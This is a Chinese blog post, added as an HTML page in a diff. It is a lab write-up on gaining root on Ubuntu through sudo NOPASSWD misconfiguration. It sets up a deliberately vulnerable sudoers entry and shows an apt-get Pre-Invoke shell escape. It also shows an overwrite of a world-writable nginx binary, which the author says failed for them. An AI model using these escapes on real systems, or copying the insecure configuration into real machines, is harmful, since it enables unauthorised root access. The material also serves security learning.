@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言通过LInux在/etc/sudoers滥配置的提权研究，原文：Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity 正文为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权12NOPAS">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux abuse of rights">
+<meta property="og:url" content="http://422926799.github.io/posts/f448c508.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言通过LInux在/etc/sudoers滥配置的提权研究，原文：Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity 正文为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权12NOPAS">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://img1.vhaor.com/mmbiz_jpg/b69RXPicqD0jxAxEowBrtc5ppKQmvTBfpNstJ0AfSPulBQ4E9Ku1sQOYYrNalqOiayFQxVfh6FfBbJfReWxicdHfQ/640?wx_fmt=jpeg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kkwtW4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kkwDw6.png">
+<meta property="og:image" content="https://lsdsecurity.com/storage/2019/01/aptgetman.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kkBTzQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kkg7tI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kk2eHJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/22/kk2a4I.md.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux abuse of rights">
+<meta name="twitter:description" content="前言通过LInux在/etc/sudoers滥配置的提权研究，原文：Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity 正文为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权12NOPAS">
+<meta name="twitter:image" content="http://img1.vhaor.com/mmbiz_jpg/b69RXPicqD0jxAxEowBrtc5ppKQmvTBfpNstJ0AfSPulBQ4E9Ku1sQOYYrNalqOiayFQxVfh6FfBbJfReWxicdHfQ/640?wx_fmt=jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Linux abuse of rights</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/6bc983cd.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/d9bed590.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/f448c508.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/f448c508.html&text=Linux abuse of rights"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/f448c508.html&is_video=false&description=Linux abuse of rights"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux abuse of rights&body=Check out this article: http://422926799.github.io/posts/f448c508.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/f448c508.html&name=Linux abuse of rights&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NOPASSWD-apt提权"><span class="toc-number">2.0.1.</span> <span class="toc-text">NOPASSWD:apt提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#usr-local-openresty-nginx-nginx提权"><span class="toc-number">2.0.2.</span> <span class="toc-text">/usr/local/openresty/nginx/nginx提权</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Linux abuse of rights
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-01-22T10:07:19.000Z" itemprop="datePublished">2019-01-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过LInux在/etc/sudoers滥配置的提权研究，原文：<a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a><br><img src="http://img1.vhaor.com/mmbiz_jpg/b69RXPicqD0jxAxEowBrtc5ppKQmvTBfpNstJ0AfSPulBQ4E9Ku1sQOYYrNalqOiayFQxVfh6FfBbJfReWxicdHfQ/640?wx_fmt=jpeg" alt="640?wx_fmt=jpeg"></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NOPASSWD的两个apt-get dpkg</span><br><span class="line">NOPASSWD与/usr/local/openresty/nginx/nginx权限为777 openresty</span><br></pre></td></tr></table></figure></p>
+<p>系统环境为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04</span><br></pre></td></tr></table></figure></p>
+<p>Ubuntu默认没有安装openresty,安装方法：<a href="https://blog.csdn.net/zstu_cc/article/details/50334585" target="_blank" rel="noopener">Ubuntu 平台下OpenResty的安装 - zstu_cc的专栏 - CSDN博客</a><br>配置出一个存在提权漏洞的环境：<br>sudo vim /etc/sudoers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cs ALL=(ALL)NOPASSWD:/usr/bin/apt-get,/usr/bin/nginx,/usr/bin/dpkg</span><br><span class="line">这里的cs为你要测试的用户名NOPASSWD后面的是执行sudo后不用输入密码的命令</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/22/kkwtW4.png" alt="kkwtW4.png"></p>
+<p>配置完之后，切换一个没root权限的用户输入sudo -l即可看到刚刚配置的操作<br><img src="https://s2.ax1x.com/2019/01/22/kkwDw6.png" alt="kkwDw6.png"></p>
+<h4 id="NOPASSWD-apt提权"><a href="#NOPASSWD-apt提权" class="headerlink" title="NOPASSWD:apt提权"></a>NOPASSWD:apt提权</h4><p>查看apt-get帮助手册可以看见，-o []option]的参数用户可以自行设置<br>图片借用原文：<br><img src="https://lsdsecurity.com/storage/2019/01/aptgetman.png" alt="aptgetman.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行：apt update APT::Update::Pre-InVoke::=&quot;/bin/bash -i&quot;</span><br></pre></td></tr></table></figure></p>
+<p>发现权限已经变更<br><img src="https://s2.ax1x.com/2019/01/22/kkBTzQ.png" alt="kkBTzQ.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pre-Invoke是预调用的意思</span><br></pre></td></tr></table></figure></p>
+<h4 id="usr-local-openresty-nginx-nginx提权"><a href="#usr-local-openresty-nginx-nginx提权" class="headerlink" title="/usr/local/openresty/nginx/nginx提权"></a>/usr/local/openresty/nginx/nginx提权</h4><p>这里我没有成功，由于/us/local/openresty/nginx/sbin/nginx权限为777，导致可以随意写入<br>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash -i&quot; &gt; /usr/local/openresty/nginx/sbin/nginx</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/22/kkg7tI.png" alt="kkg7tI.png"><br>然后原文是执行openrety即可提权成功<br><img src="https://s2.ax1x.com/2019/01/22/kk2eHJ.png" alt="kk2eHJ.png"></p>
+<p><img src="https://s2.ax1x.com/2019/01/22/kk2a4I.md.png" alt="kk2a4I.md.png"><br>知道怎么回事的师父可以告诉我一下吗= =#！</p>
+<p>后面的完全不知道怎么操作<br><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a></p>
+<p>转载请声明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NOPASSWD-apt提权"><span class="toc-number">2.0.1.</span> <span class="toc-text">NOPASSWD:apt提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#usr-local-openresty-nginx-nginx提权"><span class="toc-number">2.0.2.</span> <span class="toc-text">/usr/local/openresty/nginx/nginx提权</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/f448c508.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/f448c508.html&text=Linux abuse of rights"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/f448c508.html&is_video=false&description=Linux abuse of rights"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux abuse of rights&body=Check out this article: http://422926799.github.io/posts/f448c508.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/f448c508.html&title=Linux abuse of rights"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/f448c508.html&name=Linux abuse of rights&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
